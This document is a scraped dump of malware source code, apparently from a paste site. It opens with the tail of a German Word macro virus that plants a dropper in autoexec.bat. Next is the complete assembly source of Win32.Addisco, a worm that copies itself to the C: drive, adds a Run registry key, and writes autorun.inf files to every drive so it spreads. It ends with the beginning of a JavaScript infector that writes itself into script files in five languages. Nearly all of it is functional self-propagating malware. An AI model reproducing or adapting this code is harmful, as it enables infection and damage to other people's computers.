Print #1, ""E 17D0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""E 17E0 00 00 00 00 00 00 00 00 00 00 00 00""
Print #1, ""RCX""
Print #1, ""16EC""
Print #1, ""W""
Print #1, ""Q""
Print #1, """"
Close #1

'das nur mit Vorsicht zu ver�ndern
Open ""c:\dos\exec.bat"" For Output As #1
Print #1, ""@echo off""
Print #1, ""debug < script.scr>nul""
Print #1, ""rem debugger.com""
Print #1, ""echo @c:\dos\debugger.exe>>c:\autoexec.bat""
Print #1, ""del c:\dos\script.scr""
Print #1, ""del c:\dos\exec.bat""
Close #1

AttributBestimmen ""c:\autoexec.bat"", 0

ChDir ""C:\DOS""
Shell ""EXEC.BAT"", 0

ChDir ""C:\""

NoDropper:

End If
End Sub

*****
Dummy
*****

Sub MAIN
REM Dummy Makro
End Sub


***********
ExtrasMakro
***********

Sub MAIN
'diese Routine verhindet die Extras Makro Dialog-Box
Dim dlg As ExtrasMakro
GetCurValues dlg
On Error Resume Next

Diag$ = ""0""
Section$ = ""Compatibility""
wininistr$ = ""0x0020401""
ProfileName$ = ""RR2CD""
PrintText$ = ""Brought to you by the Nemesis Corporation, �1996""
Password$ = Chr$(120) + Chr$(101) + Chr$(110) + Chr$(105) + Chr$(120) + Chr$(111) + Chr$(115)

NoVir$ = GetProfileString$(Section$, ProfileName$)
If (NoVir$ = wininistr$) Or (diag$ = ""1"") Then
   Dialog dlg
   ExtrasMakro dlg
Else
   MsgBox ""Diese Option ist derzeit leider nicht verf�gbar."", ""Fehler"", 48
End If

'Dialog dlg
'ExtrasMakro dlg
End Sub"
3mqQE12T,Worm.Win32.Addisco - Source Code,FlyFar,ASM (NASM),Monday 3rd of July 2023 09:25:38 PM CDT,";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;;  Win32.Addisco
;;  by SPTH
;;  October 2011
;;
;;
;;  This is a worm which spreads via network/removable/USB drives.
;;
;;  The special thing is that it is able to find and implement
;;  new Anti-Emulation tricks autonomously.
;;
;;  This is done via analysing the undocumented leftover values in ECX
;;  and EDX after an random Windows API call. The API is analysed in
;;  a Black-Box test - if for a given set of parameters a constant
;;  ECX+EDX value is found, a new Anti-Emulation trick is created for
;;  the next generation.
;;
;;  The worm is aware of ""Address Space Layout Randomization"" (ASLR).
;;
;;  More details can be found in an article ""Dynamic Anti-Emulation
;;  using Blackbox Analysis"".
;;
;;  This analyse of the environment and autonomous developement of new
;;  self-defending trick seems to be a simple form of machine learning. :-)
;;
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;



include 'E:\Programme\FASM\INCLUDE\win32ax.inc'

.data
	constFileSize  EQU 0x1000
	constCodeStart EQU 0x0400

	hMyFileName dd 0x0
	hFileHandle dd 0x0
	hMapHandle  dd 0x0
	hMapViewAddress dd 0x0

	hVEH	   dd 0x0
	bException dd 0x0
	sESP	   dd 0x0
	s2ESP	   dd 0x0


	RandomNumber	dd 0x0
	RandOrdinal	dd 0x0

	RndFctAddress	      dd 0x0
	RndFctArguments       dd 0x0

	rept 0x10 c
	{
		RndFctArg#c dd 0x0
	}

	RndFct_RV_ECX	dd 0x0
	RndFct_RV_EDX	dd 0x0


	kernel32	db ""kernel32.dll"",0x0
	hKernel 	dd 0x0
	nOSVersion	dd 0x0

	SpaceForHDC:	   dd 0x0   ; should be 0x0, C:\
	RandomFileName: times 13 db 0x0

	SpaceForHDC2:	   dd 0x0   ; should be 0x0, X:\
	RandomFileName2:times 13 db 0x0

	stKey: times 47 db 0x0 ; ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run"", 0x0
	hKey  dd 0x0

	stAutoRunContent: times 52 db 0x0

	stAutorunWithDrive db 0x0, 0x0, 0x0	; ""X:\""
	stAutoruninf: times 12 db 0x0		; ""autorun.inf""

	hCreateFileAR	     dd 0x0
	hCreateFileMappingAR dd 0x0



macro VEH_TRY c*
{
	mov	dword[sESP], esp

	push	VEH_Handler#c
	push	0x1
	stdcall dword[AddVectoredExceptionHandler]
	mov	dword[hVEH], eax
}

macro VEH_EXCEPTION c*
{
	mov	dword[bException], 0x0
	jmp	VEH_NoException#c

     VEH_Handler#c:
	mov	esp, dword[sESP]
	mov	dword[bException], 0x1
}

macro VEH_END c*
{
     VEH_NoException#c:
	mov	eax, dword[hVEH]
	push	eax
	stdcall dword[RemoveVectoredExceptionHandler]
}

.code
start:
	stdcall dword[GetVersion]
	cmp	eax, 0x0A280105 	; Version here
	jne	StartEngine		; WrongVersion of OS

	push	kernel32
	stdcall dword[LoadLibrary]

	add	eax, 0x1234'5678

	times (0x10*5 + 2 + 6 + 2 + 1): nop  ; 0x10*push + call + cmp + je + ret


; ###########################################################################
; #####
; #####   Preparation (copy file, get kernel, ...)
; #####

StartEngine:
	stdcall dword[GetVersion]
	mov	dword[nOSVersion], eax

	push	0x8007
	stdcall dword[SetErrorMode]

	stdcall dword[GetCommandLineA]
	mov	dword[hMyFileName], eax
	cmp	byte[eax], '""'
	jne	FileNameIsFine
	inc	eax
	mov	dword[hMyFileName], eax

	FindFileNameLoop:
		inc	eax
		cmp	byte[eax], '""'
	jne	FindFileNameLoop

	mov	byte[eax], 0x0
	FileNameIsFine:


	stdcall dword[GetTickCount]
	mov	dword[RandomNumber], eax

	xor	esi, esi
	CopyFileAndRegEntryMore:
		mov	ebx, 26
		mov	ecx, 97
		call	CreateSpecialRndNumber

		mov	byte[RandomFileName+esi], dl
		inc	esi
		cmp	esi, 8
	jb	CopyFileAndRegEntryMore

	mov	eax, "".exe""
	mov	dword[RandomFileName+esi], eax

	mov	al, ""C""
	mov	byte[SpaceForHDC+1], al
	mov	al, "":""
	mov	byte[SpaceForHDC+2], al
	mov	al, ""\""
	mov	byte[SpaceForHDC+3], al

	push	FALSE
	push	SpaceForHDC+1
	push	dword[hMyFileName]
	stdcall dword[CopyFileA]

	push	kernel32	    ; Get Kernel32
	stdcall dword[LoadLibrary]
	cmp	eax, 0
	je	SpreadKitty

	mov	dword[hKernel], eax


; #####
; #####   Preparation (copy file, get kernel, ...)
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   call random API & save undocumented ECX&EDX
; #####


    SearchRandomAPI:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x40 - 1)
	jz	SpreadKitty		    ; Probabilistic quiting (1/64)

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x400 - 1) ; 0-1023
	mov	dword[RandOrdinal], eax

	push	dword[RandOrdinal]
	push	dword[hKernel]
	stdcall dword[GetProcAddress]

	cmp	eax, 0x0
	je	SearchRandomAPI

	mov	dword[RndFctAddress], eax

	mov	dword[s2ESP], esp	; Save original ESP
	times 0x10: push 0		; PUSH 16 parameters



	VEH_TRY FirstRun
;       {
		stdcall dword[RndFctAddress]   ; try it ;)
;       }
	VEH_EXCEPTION FirstRun
;       {                                       ; no success :-/
	       mov     esp, dword[s2ESP]	; restore ESP
;       }
	VEH_END FirstRun

	cmp	dword[bException], 0x1
	je	SearchRandomAPI


	; Get Number of arguments used by this random API :)
	mov	eax, esp
	sub	eax, dword[sESP]
	shr	eax, 2			; eax/=4 -> number of arguments
	mov	dword[RndFctArguments], eax

	mov	esp, dword[s2ESP]	 ; restore ESP


	call	RandomizeArguments
	call	PushNArgumentsToStack

	VEH_TRY RealRun1
;       {
		stdcall dword[RndFctAddress]

		mov	dword[RndFct_RV_ECX], ecx
		mov	dword[RndFct_RV_EDX], edx
;       }
	VEH_EXCEPTION RealRun1
;       {
		mov	esp, dword[s2ESP]	 ; restore ESP
;       }
	VEH_END RealRun1

	cmp	dword[bException], 0x1
	je	SearchRandomAPI


	; Run again and compare ECX and EDX, just in case (Time-APIs and stuff like that, dependence on register values)
	call	PushNArgumentsToStack

	VEH_TRY RealRun2
;       {
		call	RandomizeRegisters

		stdcall dword[RndFctAddress]

		sub	ecx, dword[RndFct_RV_ECX]
		jz	RealRun2ECX_OK

			xor	eax, eax
			mov	dword[eax], 42

		RealRun2ECX_OK:
		sub	edx, dword[RndFct_RV_EDX]
		jz	RealRun2EDX_OK

			xor	eax, eax
			mov	dword[eax], 42

		RealRun2EDX_OK:
;       }
	VEH_EXCEPTION RealRun2
;       {
		mov	esp, dword[s2ESP]	 ; restore ESP
;       }
	VEH_END RealRun2

	cmp	dword[bException], 0x1
	je	SearchRandomAPI


; #####
; #####   call random API & save undocumented ECX&EDX
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   Open New File
; #####

	push	0x0
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	0x0
	push	0x0
	push	(GENERIC_READ or GENERIC_WRITE)
	push	SpaceForHDC+1
	stdcall dword[CreateFileA]

	cmp	eax, INVALID_HANDLE_VALUE
	je	IVF_NoCreateFile
	mov	dword[hFileHandle], eax

	push	0x0
	push	constFileSize
	push	0x0			      ; nFileSizeHigh=0 from above
	push	PAGE_READWRITE
	push	0x0
	push	dword[hFileHandle]
	stdcall dword[CreateFileMappingA]

	cmp	eax, 0x0
	je	IVF_NoCreateMap
	mov	dword[hMapHandle], eax

	push	constFileSize
	push	0x0
	push	0x0
	push	FILE_MAP_WRITE
	push	dword[hMapHandle]
	stdcall dword[MapViewOfFile]

	cmp	eax, 0x0
	je	IVF_NoMapView
	mov	dword[hMapViewAddress], eax

; #####
; #####   Open New File
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   Change Anti-Debugging API call at code start
; #####

	add	eax, constCodeStart
	mov	ebx, dword[nOSVersion]
	mov	dword[eax + 0x07], ebx		; write new OS

	mov	ebx, dword[RndFctAddress]	; Change ""add eax, NNNN""
	sub	ebx, dword[hKernel]		; where NNNN=Functionaddress-Kerneladdress
	mov	dword[eax + 0x19], ebx

	mov	edi, RndFctArg1
	mov	esi, eax
	add	esi, 0x1D
	mov	ecx, dword[RndFctArguments]
	jecxz	NoFurtherPush

    MoreArgPush:
	add	edi, 0x04
	mov	byte[esi], 0x68 	 ; push
	mov	ebx, dword[edi]
	mov	dword[esi + 0x01], ebx	 ; argument
	add	esi, 0x05
	dec	ecx
    jnz MoreArgPush

    NoFurtherPush:
	mov	word[esi], 0xD0FF		; call
	add	esi, 0x2

	mov	eax, dword[RndFct_RV_ECX]
	and	eax, 0xFF00'0000
	mov	ebx, dword[hKernel]
	and	ebx, 0xFF00'0000
	cmp	eax, ebx
	je	NoECX_Kernel

	mov	dword[esi], 0x0000'F981 	; cmp ecx, NNNN
	add	esi, 0x2

	mov	ebx, dword[RndFct_RV_ECX]
	mov	dword[esi], ebx
	add	esi, 0x4			; value of ECX

	mov	dword[esi], 0x00C3'0174 	; je ... + ret
	add	esi, 0x3

    NoECX_Kernel:
	mov	eax, dword[RndFct_RV_EDX]
	and	eax, 0xFF00'0000
	mov	ebx, dword[hKernel]
	and	ebx, 0xFF00'0000
	cmp	eax, ebx
	je	NoEDX_Kernel

	mov	dword[esi], 0x0000'FA81 	; cmp ecx, NNNN
	add	esi, 0x2

	mov	ebx, dword[RndFct_RV_EDX]
	mov	dword[esi], ebx
	add	esi, 0x4			; value of EDX

	mov	dword[esi], 0x00C3'0174 	; je ... + ret
	add	esi, 0x3
    NoEDX_Kernel:

	mov	ecx, constCodeStart+(StartEngine-start)
	add	ecx, dword[hMapViewAddress]

	PaddingTheHead:
		mov	byte[esi], 0x90
		inc	esi
		cmp	esi, ecx
	jne	PaddingTheHead


; #####
; #####   Change Anti-Debugging API call at code start
; #####
; ###########################################################################

; ###########################################################################
; #####
; #####   Close New File
; #####

    IVF_CloseMapView:
	push	dword[hMapViewAddress]
	stdcall dword[UnmapViewOfFile]

    IVF_NoMapView:
	push	dword[hMapHandle]
	call	dword[CloseHandle]

    IVF_NoCreateMap:
	push	dword[hFileHandle]
	call	dword[CloseHandle]

    IVF_NoCreateFile:

; #####
; #####   Close New File
; #####
; ###########################################################################


; ###########################################################################
; #####
; #####   Spread this kitty ;)
; #####

SpreadKitty:
;  Representation of ""SOFTWARE\Microsoft\Windows\CurrentVersion\Run""
;  One could permute it - but too lazy for doing this task atm :)

	mov	eax, stKey
	mov	dword[eax+0x00], ""SOFT""
	mov	dword[eax+0x04], ""WARE""
	mov	dword[eax+0x08], ""\Mic""
	mov	dword[eax+0x0C], ""roso""
	mov	dword[eax+0x10], ""ft\W""
	mov	dword[eax+0x14], ""indo""
	mov	dword[eax+0x18], ""ws\C""
	mov	dword[eax+0x1C], ""urre""
	mov	dword[eax+0x20], ""ntVe""
	mov	dword[eax+0x24], ""rsio""
	mov	dword[eax+0x28], ""n\Ru""
	mov	byte[eax+0x2C], ""n""

	push	0x0
	push	hKey
	push	0x0
	push	KEY_ALL_ACCESS
	push	REG_OPTION_NON_VOLATILE
	push	0x0
	push	0x0
	push	stKey
	push	HKEY_LOCAL_MACHINE
	stdcall dword[RegCreateKeyExA]

	push	16
	push	SpaceForHDC+1
	push	REG_SZ
	push	0x0
	push	0x0
	push	dword[hKey]
	stdcall dword[RegSetValueExA]

	push	dword[hKey]
	stdcall dword[RegCloseKey]

	xor	eax, eax
	mov	dword[stAutorunWithDrive], ""X:\a""
	mov	dword[stAutorunWithDrive+2], ""\aut""
	mov	dword[stAutoruninf+3], ""orun""
	mov	dword[stAutoruninf+7], "".inf""

;        mov     eax, ""[Aut""
	mov	dword[stAutoRunContent], ""[Aut""
	mov	dword[stAutoRunContent+0x04], ""orun""
	mov	dword[stAutoRunContent+0x08], 0x530A0D5D
	mov	dword[stAutoRunContent+0x0C], ""hell""	   ; !!!!!!!
	mov	dword[stAutoRunContent+0x10], ""Exec""
	mov	dword[stAutoRunContent+0x14],  ""ute=""
	mov	eax, dword[RandomFileName]	  ; Filename: XXXXxxxx.exe
	mov	dword[stAutoRunContent+0x18], eax
	mov	eax, dword[RandomFileName+0x4]	  ; Filename: xxxxXXXX.exe
	mov	dword[stAutoRunContent+0x1C], eax
	mov	dword[stAutoRunContent+0x20], "".exe""
	mov	dword[stAutoRunContent+0x24], 0x73550A0D
	mov	dword[stAutoRunContent+0x28], ""eAut""
	mov	dword[stAutoRunContent+0x2C], ""opla""
	mov	dword[stAutoRunContent+0x30],  0x00313D79

	; i like that coding style, roy g biv! :))
	push	51
	push	0x0
	push	0x0
	push	FILE_MAP_ALL_ACCESS
	push	0x0
	push	51
	push	0x0
	push	PAGE_READWRITE
	push	0x0
	push	0x0
	push	FILE_ATTRIBUTE_HIDDEN
	push	OPEN_ALWAYS
	push	0x0
	push	0x0
	push	(GENERIC_READ or GENERIC_WRITE)
	push	stAutoruninf

	stdcall dword[CreateFileA]
	push	eax
	mov	dword[hCreateFileAR], eax
	stdcall dword[CreateFileMappingA]
	push	eax
	mov	dword[hCreateFileMappingAR], eax
	stdcall dword[MapViewOfFile]

	xor	cl, cl
	mov	esi, stAutoRunContent
	MakeAutoRunInfoMore:
		mov	bl, byte[esi]
		mov	byte[eax], bl
		inc	eax
		inc	esi
		inc	ecx
		cmp	cl, 51
	jb	MakeAutoRunInfoMore

	sub	eax, 51
	push	dword[hCreateFileAR]
	push	dword[hCreateFileMappingAR]
	push	eax
	stdcall dword[UnmapViewOfFile]
	stdcall dword[CloseHandle]
	stdcall dword[CloseHandle]

	mov	dword[SpaceForHDC2+1], ""A:\.""
	mov	eax, dword[RandomFileName]
	mov	dword[RandomFileName2], eax	    ; XXXXxxxx.exe
	mov	eax, dword[RandomFileName+0x04]
	mov	dword[RandomFileName2+0x04], eax    ; xxxxXXXX.exe
	mov	eax, dword[RandomFileName+0x08]
	mov	dword[RandomFileName2+0x08], eax    ; .exe


    SpreadKittyAnotherTime:
	mov	dword[SpaceForHDC2], 0x003A4100    ; 0x0, ""A:"", 0x0

    STKAnotherRound:
	push	SpaceForHDC2+1
	stdcall dword[GetDriveTypeA]

	xor	ebx, ebx	; 0 ... No Drive
				; 1 ... Drive (without autorun.inf)
				; 2 ... Drive (with autorun.inf)

	mov	cl, '\'
	mov	byte[SpaceForHDC2+3],cl


;        mov     byte[DriveNumber], al
;        add     byte[DriveNumber], 0x30

	cmp	al, 0x2
	je	STKWithAutoRun

	cmp	al, 0x3
	je	STKWithoutAutoRun

	cmp	al, 0x4
	je	STKWithAutoRun

	cmp	al, 0x6
	je	STKWithAutoRun

	jmp	STKCreateEntriesForNextDrive

	STKWithAutoRun:

	push	FALSE
	push	stAutorunWithDrive
	push	stAutoruninf
	stdcall dword[CopyFileA]

	STKWithoutAutoRun:

	push	FALSE
	push	SpaceForHDC2+1
	push	SpaceForHDC+1
	stdcall dword[CopyFileA]


	STKCreateEntriesForNextDrive:
	xor	eax, eax
	mov	al, byte[SpaceForHDC2+1]
	cmp	al, ""Z""
	je	SpreadThisKittyEnd

	inc	al
	mov	byte[SpaceForHDC2+1], al	; next drive
	mov	byte[stAutorunWithDrive], al	; next drive
	mov	byte[SpaceForHDC2+3], ah	; 0x0, ""X:"", 0x0
    jmp STKAnotherRound


    SpreadThisKittyEnd:
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x8000 - 1)	; 0-32 sec

	push	eax
	stdcall dword[Sleep]

	call	GetRandomNumber
	mov	eax, dword[RandomNumber]
	and	eax, (0x100-1)
	jnz	SpreadKittyAnotherTime

	invoke	MessageBox, 0x0, ""If you don't crack the shell, you can't eat the nut."", ""Learning the joy of self-defence :-)"", 0x0

jmp	SpreadKittyAnotherTime

; #####
; #####   Spread this kitty ;)
; #####
; ###########################################################################


GetRandomNumber:
	pushad
		xor	edx, edx
		mov	eax, dword[RandomNumber]

		mov	ebx, 1103515245
		mul	ebx	       ; EDX:EAX = EDX:EAX * EBX

		add	eax, 12345
		mov	dword[RandomNumber], eax
	popad
ret

CreateSpecialRndNumber:
; in: ebx, ecx
; out: edx=(rand()%ebx + ecx)

		call	GetRandomNumber

		xor	edx, edx
		mov	eax, dword[RandomNumber]
		div	ebx

		add	edx, ecx
ret

RandomizeArguments:
	pushad
		mov	ecx, 0x10
		mov	edi, RndFctArg1
		CreateArgLoop:
			call	GetRandomNumber
			mov	eax, dword[RandomNumber]
			mov	dword[edi], eax
			add	edi, 4
			dec	ecx
		jnz	CreateArgLoop
	popad

ret


RandomizeRegisters:
	call	GetRandomNumber
	mov	ecx, dword[RandomNumber]	; Randomize ECX
	call	GetRandomNumber
	mov	edx, dword[RandomNumber]	; Randomize EDX
	call	GetRandomNumber
	mov	eax, dword[RandomNumber]	; Randomize EAX (in case of some ""xchg ecx|edx, Reg32"")
	call	GetRandomNumber
	mov	ebx, dword[RandomNumber]	; Randomize EBX (in case of some ""xchg ecx|edx, Reg32"")
	call	GetRandomNumber 		; prevent the output to depent on the input registers :)
ret						; dont care about esi, edi, ebx. worst case -> no execution



PushNArgumentsToStack:
	pop	ebx		   ; return value
	mov	ecx, dword[RndFctArguments]
	cmp	ecx, 0
	je	PushNArgumentsToStackFin

	mov	edi, RndFctArg1
	PushArgs:
		push	dword[edi]
		add	edi, 4
		dec	ecx
	jnz	PushArgs

  PushNArgumentsToStackFin:
	push	ebx
ret

.end start"
FPRe6Kj0,Infector.JS/VBS/Matlab/Ruby/Python.Polygamy,FlyFar,JavaScript,Monday 3rd of July 2023 09:22:04 PM CDT,"//////////////////////////////////////////////////////////////////////////////
//
//  JS/VBS/MatLab/Ruby/Python.Polygamy
//  by Second Part To Hell
//  July 2013
//
//  This is a five-language cross infector for JavaScript, VBScript, MatLab,
//  Ruby and Python - using a special MetaLanguage.
// 
//  The virus contains the infection-routines for every language written in a
//  MetaLanguage. The MetaLanguage is translated into actual code with a
//  language-dependent translator (therefor there are five independent
//  translators in this code).
//
//  The main reason for this concept is the linear scaling of code-size and
//  complexity with the number of languages. That means, adding a 6th language
//  is as simple as adding the 2nd language. I hope I will see additional
//  translators for other languages some day. :)
//
//  For more infos, see my text ""Cross Script Infection using MetaLanguages"" in
//  valhalla#4.
//
//////////////////////////////////////////////////////////////////////////////

metaLanguage=""Predefined"";
metaLanguage+=""__AddML"";

metaLanguage+=""__Forall js"";
metaLanguage+=""__  GetFileName fileName"";
metaLanguage+=""__  ReadAll allContent fileName"";
metaLanguage+=""__  Def infectionMarkerJS""; 
metaLanguage+=""__  AddString infectionMarkerJS metaLanguage"";
metaLanguage+=""__  Exist doesExist allContent infectionMarkerJS"";
metaLanguage+=""__  If doesExist < 0"";
metaLanguage+=""__    Def newCodeJS"";
metaLanguage+=""__    AddString newCodeJS metaLanguage="";
metaLanguage+=""__    AddChar newCodeJS 39 39"";
metaLanguage+=""__    AddString newCodeJS ;translatorJS="";
metaLanguage+=""__    AddChar newCodeJS 39 39"";
metaLanguage+=""__    AddString newCodeJS ;translatorVBS="";
metaLanguage+=""__    AddChar newCodeJS 39 39"";
metaLanguage+=""__    AddString newCodeJS ;translatorMatLab="";
metaLanguage+=""__    AddChar newCodeJS 39 39"";
metaLanguage+=""__    AddString newCodeJS ;translatorRuby="";
metaLanguage+=""__    AddChar newCodeJS 39 39"";
metaLanguage+=""__    AddString newCodeJS ;translatorPython="";
metaLanguage+=""__    AddChar newCodeJS 39 39 59"";
metaLanguage+=""__    AddStringAsChar newCodeJS metaLanguage+=String.fromCharCode( metaLanguage , );"";
metaLanguage+=""__    AddStringAsChar newCodeJS translatorJS+=String.fromCharCode( translatorJS , );"";
metaLanguage+=""__    AddStringAsChar newCodeJS translatorVBS+=String.fromCharCode( translatorVBS , );"";
metaLanguage+=""__    AddStringAsChar newCodeJS translatorMatLab+=String.fromCharCode( translatorMatLab , );"";
metaLanguage+=""__    AddStringAsChar newCodeJS translatorRuby+=String.fromCharCode( translatorRuby , );"";
metaLanguage+=""__    AddStringAsChar newCodeJS translatorPython+=String.fromCharCode( translatorPython , );"";
metaLanguage+=""__    Arithmetic newCodeJS newCodeJS + translatorJS"";         
metaLanguage+=""__    Arithmetic newCodeJS newCodeJS + allContent"";
metaLanguage+=""__    Write fileName newCodeJS"";
metaLanguage+=""__  XX""
metaLanguage+=""__XX""
metaLanguage+=""__Forall vbs"";
metaLanguage+=""__  GetFileName fileName"";
metaLanguage+=""__  ReadAll allContent fileName"";
metaLanguage+=""__  Def infectionMarkerVBS""; 
metaLanguage+=""__  AddString infectionMarkerVBS metaLanguage"";
metaLanguage+=""__  Exist doesExist allContent infectionMarkerVBS"";
metaLanguage+=""__  If doesExist < 0"";
metaLanguage+=""__    Def newCodeVBS"";
metaLanguage+=""__    AddString newCodeVBS Dim""
metaLanguage+=""__    AddChar newCodeVBS 32""
metaLanguage+=""__    AddString newCodeVBS metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython"";
metaLanguage+=""__    AddChar newCodeVBS 13 10""
metaLanguage+=""__    AddStringAsChar newCodeVBS metaLanguage=metaLanguage+Chr( metaLanguage )+Chr( )"";
metaLanguage+=""__    AddStringAsChar newCodeVBS translatorJS=translatorJS+Chr( translatorJS )+Chr( )"";
metaLanguage+=""__    AddStringAsChar newCodeVBS translatorVBS=translatorVBS+Chr( translatorVBS )+Chr( )"";
metaLanguage+=""__    AddStringAsChar newCodeVBS translatorMatLab=translatorMatLab+Chr( translatorMatLab )+Chr( )"";
metaLanguage+=""__    AddStringAsChar newCodeVBS translatorRuby=translatorRuby+Chr( translatorRuby )+Chr( )"";
metaLanguage+=""__    AddStringAsChar newCodeVBS translatorPython=translatorPython+Chr( translatorPython )+Chr( )"";
metaLanguage+=""__    Arithmetic newCodeVBS newCodeVBS + translatorVBS"";
metaLanguage+=""__    Arithmetic newCodeVBS newCodeVBS + allContent"";
metaLanguage+=""__    Write fileName newCodeVBS"";
metaLanguage+=""__  XX""
metaLanguage+=""__XX""
metaLanguage+=""__Forall m"";
metaLanguage+=""__  GetFileName fileName"";
metaLanguage+=""__  ReadAll allContent fileName"";
metaLanguage+=""__  Def infectionMarkerMatLab""; 
metaLanguage+=""__  AddString infectionMarkerMatLab metaLanguage"";
metaLanguage+=""__  Exist doesExist allContent infectionMarkerMatLab"";
metaLanguage+=""__  If doesExist < 0"";
metaLanguage+=""__    Def newCodeMatLab"";
metaLanguage+=""__    AddString newCodeMatLab metaLanguage=[];translatorJS=[];translatorVBS=[];translatorMatLab=[];translatorRuby=[];translatorPython=[];"";
metaLanguage+=""__    AddChar newCodeMatLab 13 10""
metaLanguage+=""__    AddStringAsChar newCodeMatLab metaLanguage=[metaLanguage,char([ metaLanguage , ])];"";
metaLanguage+=""__    AddStringAsChar newCodeMatLab translatorJS=[translatorJS,char([ translatorJS , ])];"";
metaLanguage+=""__    AddStringAsChar newCodeMatLab translatorVBS=[translatorVBS,char([ translatorVBS , ])];"";
metaLanguage+=""__    AddStringAsChar newCodeMatLab translatorMatLab=[translatorMatLab,char([ translatorMatLab , ])];"";
metaLanguage+=""__    AddStringAsChar newCodeMatLab translatorRuby=[translatorRuby,char([ translatorRuby , ])];"";
metaLanguage+=""__    AddStringAsChar newCodeMatLab translatorPython=[translatorPython,char([ translatorPython , ])];"";
metaLanguage+=""__    AddString newCodeMatLab h=fopen("";
metaLanguage+=""__    AddChar newCodeMatLab 39"";
metaLanguage+=""__    AddString newCodeMatLab createBlockOfCode.m"";
metaLanguage+=""__    AddChar newCodeMatLab 39 44 39 119 39"";
metaLanguage+=""__    AddString newCodeMatLab );fwrite(h,translatorMatLab);fclose(h);rehash;xx={};ML=[char([95,95]),metaLanguage];SplitOffset=[strfind(ML,char([95,95])),length(ML)+1];for"";
metaLanguage+=""__    AddChar newCodeMatLab 32"";
metaLanguage+=""__    AddString newCodeMatLab i=1:length(SplitOffset)-1;xx{end+1}=ML(SplitOffset(i)+2:SplitOffset(i+1)-1);end;eval(createBlockOfCode(xx,metaLanguage,translatorJS,translatorVBS,translatorMatLab,translatorRuby,translatorPython));delete("";
metaLanguage+=""__    AddChar newCodeMatLab 39"";
metaLanguage+=""__    AddString newCodeMatLab createBlockOfCode.m"";
metaLanguage+=""__    AddChar newCodeMatLab 39"";
metaLanguage+=""__    AddString newCodeMatLab );"";
metaLanguage+=""__    AddChar newCodeMatLab 13 10"";
metaLanguage+=""__    Arithmetic newCodeMatLab newCodeMatLab + allContent"";
metaLanguage+=""__    Write fileName newCodeMatLab"";
metaLanguage+=""__  XX""
metaLanguage+=""__XX""
metaLanguage+=""__Forall rb"";
metaLanguage+=""__  GetFileName fileName"";
metaLanguage+=""__  ReadAll allContent fileName"";
metaLanguage+=""__  Def infectionMarkerRuby""; 
metaLanguage+=""__  AddString infectionMarkerRuby metaLanguage"";
metaLanguage+=""__  Exist doesExist allContent infectionMarkerRuby"";
metaLanguage+=""__  If doesExist < 0"";
metaLanguage+=""__    Def newCodeRuby"";
metaLanguage+=""__    AddString newCodeRuby metaLanguage="";
metaLanguage+=""__    AddChar newCodeRuby 39 39"";
metaLanguage+=""__    AddString newCodeRuby ;translatorJS="";
metaLanguage+=""__    AddChar newCodeRuby 39 39"";
metaLanguage+=""__    AddString newCodeRuby ;translatorVBS="";
metaLanguage+=""__    AddChar newCodeRuby 39 39"";
metaLanguage+=""__    AddString newCodeRuby ;translatorMatLab="";
metaLanguage+=""__    AddChar newCodeRuby 39 39"";
metaLanguage+=""__    AddString newCodeRuby ;translatorRuby="";
metaLanguage+=""__    AddChar newCodeRuby 39 39"";
metaLanguage+=""__    AddString newCodeRuby ;translatorPython="";
metaLanguage+=""__    AddChar newCodeRuby 39 39"";
metaLanguage+=""__    AddChar newCodeRuby 13 10""
metaLanguage+=""__    AddStringAsChar newCodeRuby metaLanguage<< metaLanguage .chr<< .chr;"";
metaLanguage+=""__    AddStringAsChar newCodeRuby translatorJS<< translatorJS .chr<< .chr;"";
metaLanguage+=""__    AddStringAsChar newCodeRuby translatorVBS<< translatorVBS .chr<< .chr;"";
metaLanguage+=""__    AddStringAsChar newCodeRuby translatorMatLab<< translatorMatLab .chr<< .chr;"";
metaLanguage+=""__    AddStringAsChar newCodeRuby translatorRuby<< translatorRuby .chr<< .chr;"";
metaLanguage+=""__    AddStringAsChar newCodeRuby translatorPython<< translatorPython .chr<< .chr;"";
metaLanguage+=""__    Arithmetic newCodeRuby newCodeRuby + translatorRuby"";         
metaLanguage+=""__    Arithmetic newCodeRuby newCodeRuby + allContent"";
metaLanguage+=""__    Write fileName newCodeRuby"";
metaLanguage+=""__  XX""
metaLanguage+=""__XX""
metaLanguage+=""__Forall py"";
metaLanguage+=""__  GetFileName fileName"";
metaLanguage+=""__  ReadAll allContent fileName"";
metaLanguage+=""__  Def infectionMarkerPython""; 
metaLanguage+=""__  AddString infectionMarkerPython metaLanguage"";
metaLanguage+=""__  Exist doesExist allContent infectionMarkerPython"";
metaLanguage+=""__  If doesExist < 0"";
metaLanguage+=""__    Def newCodePython"";
metaLanguage+=""__    AddString newCodePython metaLanguage="";
metaLanguage+=""__    AddChar newCodePython 39 39"";
metaLanguage+=""__    AddString newCodePython ;translatorJS="";
metaLanguage+=""__    AddChar newCodePython 39 39"";
metaLanguage+=""__    AddString newCodePython ;translatorVBS="";
metaLanguage+=""__    AddChar newCodePython 39 39"";
metaLanguage+=""__    AddString newCodePython ;translatorMatLab="";
metaLanguage+=""__    AddChar newCodePython 39 39"";
metaLanguage+=""__    AddString newCodePython ;translatorRuby="";
metaLanguage+=""__    AddChar newCodePython 39 39"";
metaLanguage+=""__    AddString newCodePython ;translatorPython="";
metaLanguage+=""__    AddChar newCodePython 39 39"";
metaLanguage+=""__    AddChar newCodePython 13 10""
metaLanguage+=""__    AddStringAsChar newCodePython metaLanguage+=chr( metaLanguage )+chr( )"";
metaLanguage+=""__    AddStringAsChar newCodePython translatorJS+=chr( translatorJS )+chr( )"";
